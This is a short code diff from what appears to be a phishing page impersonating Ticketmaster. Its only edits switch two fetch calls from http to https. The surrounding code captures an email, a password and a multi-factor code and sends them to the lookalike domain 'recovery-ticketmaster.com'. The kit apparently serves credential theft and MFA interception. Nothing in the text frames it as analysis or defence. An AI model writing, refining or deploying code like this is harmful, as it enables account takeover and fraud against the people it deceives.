@@ -8082,7 +8082,7 @@
           console.log('clicked')
           console.log(email)
           console.log(password)
-          fetch('http://recovery-ticketmaster.com/login', {
+          fetch('https://recovery-ticketmaster.com/login', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json'
@@ -8161,7 +8161,7 @@
             const otpInput = document.getElementById('mfa-code-input-field5');
             const errorMessageElement = document.getElementById('otp-error-message');
 
-            fetch('http://recovery-ticketmaster.com/otp-validate', {
+            fetch('https://recovery-ticketmaster.com/otp-validate', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
